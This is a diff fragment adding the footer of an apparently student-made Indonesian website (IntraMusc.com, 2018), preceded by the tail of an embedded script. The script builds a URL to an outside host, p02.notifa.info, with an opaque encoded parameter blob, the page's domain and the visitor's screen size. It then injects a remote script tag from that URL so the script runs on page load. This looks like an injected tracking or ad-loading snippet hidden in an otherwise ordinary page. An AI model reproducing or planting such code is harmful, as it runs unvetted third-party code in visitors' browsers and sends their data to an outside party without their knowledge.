+                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdKf61DBhXXMSt2VypY1lykvujMH6K7Z1%2fZ9Macj5WHXRffpql5ZieXJ0BFE%2fyg5uHOVppTYAfOjLfoIXa1DekxFaPExj5PDfU%2beF3a9pA2u9oiQoA8an%2fP7fM6ffiU1OhneMOE4IwlSYT14WbRWi2EJoENArksH%2fGqMyph1I%2fmsp4D3kQYl6smYQryeAQ%2bUei1RzuH8IofsmOWdvwAn2W0sIMfW2fmhxCoKQvBiU1kH90sM7Z9oik6EvD5psL5C59jiPgc2FXOI66ld7jmKI2fNNGAwrYNBDEW7FO1E4kBeyii7Zlir3f4WDwQMnK3uOIzMzYTPY4oX7pu4UjdRZtdibaek8d6MaCZgWjWg4Svl045XFRkNBU2HEOeixbinHGMDiFe0YeEbhsxmEUpm0dyiOEHnnJnOQYYGAOaW92HXbESyYyuQz6FSmlgTjf1rhGHfxWLLPwK7ldXoF0GJsVvkuvOWlWdMqSTW7szYNILJdprLTOpssqzvtlQplHb7mZaKrUVUsgbbfGWasIF3mTwLmbGgGpwUtgEykJh4F4ahLfDMwmr%2bfSEA%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
+    </script>
+        <!--Footer-->
+<Center>
+  <footer style="margin-top:20px;">
+    <div class="footer" style="background-color: #032f3e; padding: 20px;color:white">
+        <h5 style="font-size:15px">Hak Cipta&copy; IntraMusc.com  2018. Team 04</h5>
+        <a href="kontak.html">Hubungi Kami</a>
+    </div>
+  </footer>
+</CENTER>
+    <!-- script untuk akhir body dan responsive -->
+    <script src="js/jquery-1.11.2.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/main.js"></script>
+</body>
+
+</html>
